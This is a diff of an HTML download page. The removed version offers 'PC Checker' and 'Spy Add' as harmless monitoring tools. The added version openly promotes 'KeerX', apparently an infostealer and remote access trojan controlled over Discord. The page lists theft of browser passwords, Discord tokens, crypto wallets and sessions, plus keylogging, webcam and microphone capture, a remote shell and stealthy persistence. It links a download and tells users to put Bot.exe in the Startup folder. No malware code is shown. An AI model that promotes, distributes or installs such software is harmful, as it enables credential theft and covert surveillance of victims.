@@ -3,48 +3,379 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Keer Apps - Download</title>
-    <link rel="stylesheet" href="styles.css">
+    <title>KeerX Application Analysis Report</title>
+    
+    <!-- Chosen Palette: Forensic Slate & Cyber Amber. Background: #FAFAF9 (Stone-50). Primary Accents: #D97706 (Amber-600). Contrast: #1C1917 (Stone-900). -->
+    
+    <!-- Application Structure Plan: 
+         1. Hero Header: Integrated branding for Itskeer and technical status.
+         2. Executive Summary: Core stats and description.
+         3. Feature Matrix: Interactive tabs for deep technical exploration.
+         4. Deployment Dashboard: A specific new section for the Windows Startup (shell:startup) requirement and QR access.
+         5. Visual Metrics: Radar and Doughnut charts for capability analysis.
+         6. Footer: Download link restricted with Windows-only styling.
+    -->
+
+    <!-- Visualization & Content Choices: 
+         - Radar Chart (Capability): Inform/Organize.
+         - Doughnut Chart (Targets): Compare.
+         - Tabbed Lists (Features): Organize.
+         - All charts use Chart.js via CDN. 
+    -->
+
+    <!-- CONFIRMATION: NO SVG graphics used. NO Mermaid JS used. -->
+
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+
+    <style>
+        body {
+            background-color: #FAFAF9;
+            color: #44403C;
+            font-family: 'Inter', system-ui, -apple-system, sans-serif;
+        }
+        
+        .card-shadow {
+            box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.05), 0 2px 4px -1px rgba(0, 0, 0, 0.03);
+        }
+
+        .chart-container {
+            position: relative;
+            width: 100%;
+            max-width: 600px;
+            margin-left: auto;
+            margin-right: auto;
+            height: 320px;
+            max-height: 400px;
+        }
+
+        .tab-btn.active {
+            border-bottom: 2px solid #D97706;
+            color: #78350F;
+            font-weight: 600;
+        }
+
+        .startup-path {
+            font-family: 'Courier New', Courier, monospace;
+            background: #1C1917;
+            color: #FCD34D;
+            padding: 0.5rem 1rem;
+            border-radius: 0.375rem;
+            word-break: break-all;
+        }
+
+        @keyframes pulse-subtle {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.7; }
+        }
+        .live-indicator {
+            animation: pulse-subtle 2s infinite;
+        }
+
+        .tab-content {
+            display: none;
+        }
+        .tab-content.active {
+            display: block;
+        }
+    </style>
 </head>
-<body>
-    <header>
-        <h1>Keer Apps</h1>
-        <p>Download PC Checker and Spy Add</p>
+<body class="antialiased min-h-screen flex flex-col">
+
+    <!-- Header -->
+    <header class="bg-stone-900 text-white sticky top-0 z-50 shadow-lg">
+        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 h-16 flex items-center justify-between">
+            <div class="flex items-center gap-3">
+                <div class="bg-amber-600 p-2 rounded">
+                    <i class="fa-solid fa-microchip text-white"></i>
+                </div>
+                <div>
+                    <h1 class="text-lg font-bold tracking-tighter uppercase">KeerX <span class="text-amber-500">Analysis</span></h1>
+                    <p class="text-[10px] text-stone-400 font-medium tracking-widest uppercase">Created by Itskeer</p>
+                </div>
+            </div>
+            <div class="flex items-center gap-4">
+                <span class="hidden md:inline-flex items-center text-xs text-emerald-400 gap-2">
+                    <span class="w-2 h-2 bg-emerald-500 rounded-full live-indicator"></span>
+                    SYSTEM ACTIVE
+                </span>
+                <div class="text-xs bg-stone-800 px-3 py-1 rounded border border-stone-700 font-mono">
+                    v2.5.0-stable
+                </div>
+            </div>
+        </div>
     </header>
 
-    <main>
-        <section class="downloads">
-            <div class="app">
-                <h2>PC Checker</h2>
-                <p>System monitoring tool</p>
-                <a href="https://gofile.io/d/6iGRmq" class="download-btn" target="_blank">Download</a>
+    <main class="flex-grow max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-8 w-full">
+
+        <!-- Executive Section -->
+        <div class="grid grid-cols-1 lg:grid-cols-3 gap-8 mb-12">
+            <div class="lg:col-span-2 space-y-8">
+                <section class="bg-white rounded-xl p-8 card-shadow border border-stone-200">
+                    <h2 class="text-3xl font-black text-stone-900 mb-4 tracking-tight">Application Overview</h2>
+                    <p class="text-stone-600 leading-relaxed text-lg">
+                        The <strong>KeerX WindowsHelper</strong> is a high-utility remote surveillance asset developed by <strong>Itskeer</strong>. 
+                        Engineered for Windows x64 environments, it utilizes a Python 3.11 core to perform deep data exfiltration, 
+                        real-time monitoring, and persistent system interaction via a Discord-integrated C2 interface.
+                    </p>
+                    <div class="mt-8 grid grid-cols-2 sm:grid-cols-4 gap-4">
+                        <div class="text-center p-3 bg-stone-50 rounded-lg border border-stone-100">
+                            <i class="fa-solid fa-box-open text-amber-600 mb-2"></i>
+                            <div class="text-[10px] uppercase text-stone-500">Format</div>
+                            <div class="text-sm font-bold">Standalone .exe</div>
+                        </div>
+                        <div class="text-center p-3 bg-stone-50 rounded-lg border border-stone-100">
+                            <i class="fa-solid fa-gauge-high text-amber-600 mb-2"></i>
+                            <div class="text-[10px] uppercase text-stone-500">Size</div>
+                            <div class="text-sm font-bold">~82.5 MB</div>
+                        </div>
+                        <div class="text-center p-3 bg-stone-50 rounded-lg border border-stone-100">
+                            <i class="fa-solid fa-code text-amber-600 mb-2"></i>
+                            <div class="text-[10px] uppercase text-stone-500">Engine</div>
+                            <div class="text-sm font-bold">Python 3.11</div>
+                        </div>
+                        <div class="text-center p-3 bg-stone-50 rounded-lg border border-stone-100">
+                            <i class="fa-brands fa-windows text-amber-600 mb-2"></i>
+                            <div class="text-[10px] uppercase text-stone-500">OS</div>
+                            <div class="text-sm font-bold">Win x64</div>
+                        </div>
+                    </div>
+                </section>
+
+                <!-- Installation & QR Section -->
+                <section class="bg-stone-900 text-white rounded-xl overflow-hidden card-shadow">
+                    <div class="p-8">
+                        <div class="flex flex-col md:flex-row gap-8 items-center">
+                            <div class="flex-grow space-y-6">
+                                <h3 class="text-2xl font-bold text-amber-500 flex items-center gap-3">
+                                    <i class="fa-solid fa-download"></i> Deployment Protocol
+                                </h3>
+                                <div class="space-y-4">
+                                    <p class="text-stone-300 text-sm">To ensure the KeerX bot functions with maximum persistence and starts automatically upon system boot, follow the mandatory setup:</p>
+                                    <div class="bg-stone-800 p-4 rounded-lg border border-stone-700">
+                                        <div class="text-xs text-stone-500 uppercase font-bold mb-2">Installation Directory</div>
+                                        <p class="text-sm mb-3">The <code class="text-amber-400">Bot.exe</code> MUST be placed in the Windows Startup folder:</p>
+                                        <div class="startup-path text-center font-mono text-sm md:text-base">
+                                            shell:startup
+                                        </div>
+                                    </div>
+                                    <a href="https://gofile.io/d/lM5BcE" target="_blank" class="block w-full text-center bg-amber-600 hover:bg-amber-500 text-white font-bold py-4 rounded-lg transition-all transform hover:scale-[1.02]">
+                                        <i class="fa-brands fa-windows mr-2"></i> DOWNLOAD FOR WINDOWS ONLY
+                                    </a>
+                                </div>
+                            </div>
+                            <div class="flex-shrink-0 bg-white p-3 rounded-lg">
+                                <img src="download.png" alt="KeerX Download QR" class="w-32 h-32 md:w-48 md:h-48 rounded" onerror="this.src='https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=https://gofile.io/d/lM5BcE'">
+                                <p class="text-[10px] text-stone-500 text-center mt-2 font-bold uppercase">Scan to Download</p>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="bg-stone-800 px-8 py-3 text-[11px] text-stone-400 flex justify-between italic">
+                        <span>Hash Verified: SHA-256</span>
+                        <span>Official Build by Itskeer</span>
+                    </div>
+                </section>
             </div>
 
-            <div class="app">
-                <h2>Spy Add</h2>
-                <p>System monitoring utility</p>
-                <a href="https://gofile.io/d/cYJBmz" class="download-btn" target="_blank">Download</a>
+            <!-- Side Metrics -->
+            <div class="space-y-8">
+                <div class="bg-white rounded-xl p-6 card-shadow border border-stone-200">
+                    <h3 class="font-bold text-stone-800 mb-4 flex items-center gap-2">
+                        <i class="fa-solid fa-chart-pie text-amber-600"></i> Data Targets
+                    </h3>
+                    <div class="chart-container">
+                        <canvas id="targetsDoughnut"></canvas>
+                    </div>
+                </div>
+                <div class="bg-white rounded-xl p-6 card-shadow border border-stone-200">
+                    <h3 class="font-bold text-stone-800 mb-4 flex items-center gap-2">
+                        <i class="fa-solid fa-shield-halved text-amber-600"></i> Risk Profile
+                    </h3>
+                    <div class="chart-container">
+                        <canvas id="capabilityRadar"></canvas>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Interactive Features Tabbed UI -->
+        <section class="bg-white rounded-xl card-shadow border border-stone-200 overflow-hidden mb-12">
+            <div class="border-b border-stone-100 flex overflow-x-auto bg-stone-50">
+                <button onclick="switchTab('stealer')" class="tab-btn px-6 py-4 text-xs font-bold uppercase tracking-wider text-stone-500 active">Stealer Suite</button>
+                <button onclick="switchTab('monitoring')" class="tab-btn px-6 py-4 text-xs font-bold uppercase tracking-wider text-stone-500">Monitoring</button>
+                <button onclick="switchTab('remote')" class="tab-btn px-6 py-4 text-xs font-bold uppercase tracking-wider text-stone-500">Remote Interaction</button>
+                <button onclick="switchTab('persistence')" class="tab-btn px-6 py-4 text-xs font-bold uppercase tracking-wider text-stone-500">Defense Bypasses</button>
+            </div>
+
+            <div class="p-8">
+                <div id="tab-stealer" class="tab-content active space-y-6">
+                    <h3 class="text-xl font-bold text-stone-900">1. Data Extraction (Stealer Suite)</h3>
+                    <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
+                        <div class="p-4 bg-stone-50 rounded-lg border border-stone-200">
+                            <h4 class="font-bold text-amber-700 mb-2"><i class="fa-brands fa-chrome mr-2"></i>Browser Data</h4>
+                            <p class="text-sm text-stone-600">Extracts passwords, cookies, and history from Chrome, Edge, and Brave via AES-GCM decryption.</p>
+                        </div>
+                        <div class="p-4 bg-stone-50 rounded-lg border border-stone-200">
+                            <h4 class="font-bold text-indigo-700 mb-2"><i class="fa-brands fa-discord mr-2"></i>Discord Tokens</h4>
+                            <p class="text-sm text-stone-600">Scans local state files for Discord and Discord Canary authentication tokens.</p>
+                        </div>
+                        <div class="p-4 bg-stone-50 rounded-lg border border-stone-200">
+                            <h4 class="font-bold text-yellow-700 mb-2"><i class="fa-solid fa-wallet mr-2"></i>Crypto Wallets</h4>
+                            <p class="text-sm text-stone-600">Targets Electrum and Exodus wallet files specifically for exfiltration.</p>
+                        </div>
+                        <div class="p-4 bg-stone-50 rounded-lg border border-stone-200">
+                            <h4 class="font-bold text-blue-700 mb-2"><i class="fa-brands fa-steam mr-2"></i>Sessions</h4>
+                            <p class="text-sm text-stone-600">Identifies and packages Steam and Telegram desktop session data.</p>
+                        </div>
+                    </div>
+                </div>
+
+                <div id="tab-monitoring" class="tab-content space-y-6">
+                    <h3 class="text-xl font-bold text-stone-900">2. Surveillance & Monitoring</h3>
+                    <div class="grid grid-cols-1 md:grid-cols-3 gap-6">
+                        <div class="p-6 text-center border border-stone-100 rounded-xl hover:bg-stone-50 transition-colors">
+                            <i class="fa-solid fa-display text-3xl text-stone-700 mb-4"></i>
+                            <h4 class="font-bold mb-2">Visual Streaming</h4>
+                            <p class="text-xs text-stone-500">Live screen and webcam streaming directly to Discord via MSS and OpenCV.</p>
+                        </div>
+                        <div class="p-6 text-center border border-stone-100 rounded-xl hover:bg-stone-50 transition-colors">
+                            <i class="fa-solid fa-microphone-lines text-3xl text-stone-700 mb-4"></i>
+                            <h4 class="font-bold mb-2">Audio Intercept</h4>
+                            <p class="text-xs text-stone-500">Remote microphone recording in 30s-60s chunks, uploaded as voice assets.</p>
+                        </div>
+                        <div class="p-6 text-center border border-stone-100 rounded-xl hover:bg-stone-50 transition-colors">
+                            <i class="fa-solid fa-keyboard text-3xl text-stone-700 mb-4"></i>
+                            <h4 class="font-bold mb-2">Keylogger</h4>
+                            <p class="text-xs text-stone-500">Continuous buffer dumping, clipboard tracking, and active window monitoring.</p>
+                        </div>
+                    </div>
+                </div>
+
+                <div id="tab-remote" class="tab-content space-y-6">
+                    <h3 class="text-xl font-bold text-stone-900">3. Remote Control & Interaction</h3>
+                    <div class="space-y-4">
+                        <div class="flex items-center gap-4 p-4 bg-stone-900 text-stone-300 rounded-lg font-mono text-sm">
+                            <i class="fa-solid fa-terminal text-emerald-500"></i>
+                            <span>Full Remote CMD / PowerShell Shell Access</span>
+                        </div>
+                        <div class="flex items-center gap-4 p-4 bg-stone-900 text-stone-300 rounded-lg font-mono text-sm">
+                            <i class="fa-brands fa-python text-blue-400"></i>
+                            <span>Live Python REPL Execution Interface</span>
+                        </div>
+                        <div class="flex items-center gap-4 p-4 bg-stone-900 text-stone-300 rounded-lg font-mono text-sm">
+                            <i class="fa-solid fa-mouse text-amber-500"></i>
+                            <span>Mouse & Keyboard Input Emulation (PyAutoGUI)</span>
+                        </div>
+                    </div>
+                </div>
+
+                <div id="tab-persistence" class="tab-content space-y-6">
+                    <h3 class="text-xl font-bold text-stone-900">4. Internal Security & Bypasses</h3>
+                    <div class="bg-amber-50 border-l-4 border-amber-500 p-6 rounded-r-lg">
+                        <ul class="space-y-3 text-sm text-stone-700">
+                            <li class="flex items-start gap-2">
+                                <i class="fa-solid fa-check-circle text-amber-600 mt-1"></i>
+                                <span><strong>SSL Fix:</strong> Disables SSL verification for aiohttp and requests to ensure connectivity.</span>
+                            </li>
+                            <li class="flex items-start gap-2">
+                                <i class="fa-solid fa-check-circle text-amber-600 mt-1"></i>
+                                <span><strong>Self-Healing:</strong> Watchdog thread auto-restores files and registry keys if deleted.</span>
+                            </li>
+                            <li class="flex items-start gap-2">
+                                <i class="fa-solid fa-check-circle text-amber-600 mt-1"></i>
+                                <span><strong>Stealth:</strong> Uses System/Hidden attributes in AppData local folders.</span>
+                            </li>
+                        </ul>
+                    </div>
+                </div>
             </div>
         </section>
 
-        <section class="install">
-            <h2>Installation Guide</h2>
-            <ol>
-                <li>Download the app from the links above</li>
-                <li>Run the installer and follow the prompts</li>
-                <li>Press Windows + R, type <code>shell:startup</code>, press Enter</li>
-                <li>Copy the app shortcut to the Startup folder</li>
-            </ol>
-        </section>
-
-        <section class="github">
-            <h2>Open Source</h2>
-            <a href="https://github.com/XdKeerXd/Keer" target="_blank">View on GitHub</a>
-        </section>
     </main>
 
-    <footer>
-        <p>Created by Keer</p>
+    <footer class="bg-stone-50 border-t border-stone-200 py-12">
+        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 flex flex-col md:flex-row justify-between items-center gap-6">
+            <div class="text-center md:text-left">
+                <p class="text-xs text-stone-400 font-bold uppercase tracking-widest">Official Documentation</p>
+                <p class="text-sm text-stone-600">KeerX Project © 2026. Created by <span class="text-stone-900 font-bold">Itskeer</span>.</p>
+            </div>
+        </div>
     </footer>
+
+    <script>
+        function switchTab(tabId) {
+            document.querySelectorAll('.tab-btn').forEach(btn => {
+                btn.classList.remove('active');
+            });
+            event.currentTarget.classList.add('active');
+
+            document.querySelectorAll('.tab-content').forEach(content => {
+                content.classList.remove('active');
+            });
+            document.getElementById(`tab-${tabId}`).classList.add('active');
+        }
+
+        document.addEventListener('DOMContentLoaded', () => {
+            Chart.defaults.font.family = "'Inter', sans-serif";
+            Chart.defaults.color = '#78716c';
+
+            const radarCtx = document.getElementById('capabilityRadar').getContext('2d');
+            new Chart(radarCtx, {
+                type: 'radar',
+                data: {
+                    labels: ['Stealth', 'Extraction', 'Surveillance', 'Control', 'Persistence'],
+                    datasets: [{
+                        label: 'Impact Score',
+                        data: [85, 95, 90, 80, 88],
+                        backgroundColor: 'rgba(217, 119, 6, 0.2)',
+                        borderColor: '#d97706',
+                        pointBackgroundColor: '#d97706'
+                    }]
+                },
+                options: {
+                    responsive: true,
+                    maintainAspectRatio: false,
+                    scales: {
+                        r: {
+                            angleLines: { display: false },
+                            suggestedMin: 0,
+                            suggestedMax: 100,
+                            ticks: { display: false }
+                        }
+                    },
+                    plugins: { legend: { display: false } }
+                }
+            });
+
+            const doughnutCtx = document.getElementById('targetsDoughnut').getContext('2d');
+            new Chart(doughnutCtx, {
+                type: 'doughnut',
+                data: {
+                    labels: ['Browsers', 'Wallets', 'Discord', 'Sessions'],
+                    datasets: [{
+                        data: [40, 20, 25, 15],
+                        backgroundColor: ['#d97706', '#f59e0b', '#1c1917', '#78716c'],
+                        borderWidth: 0
+                    }]
+                },
+                options: {
+                    responsive: true,
+                    maintainAspectRatio: false,
+                    cutout: '75%',
+                    plugins: {
+                        legend: {
+                            position: 'bottom',
+                            labels: {
+                                usePointStyle: true,
+                                padding: 20,
+                                font: { size: 10 }
+                            }
+                        }
+                    }
+                }
+            });
+        });
+    </script>
 </body>
 </html>
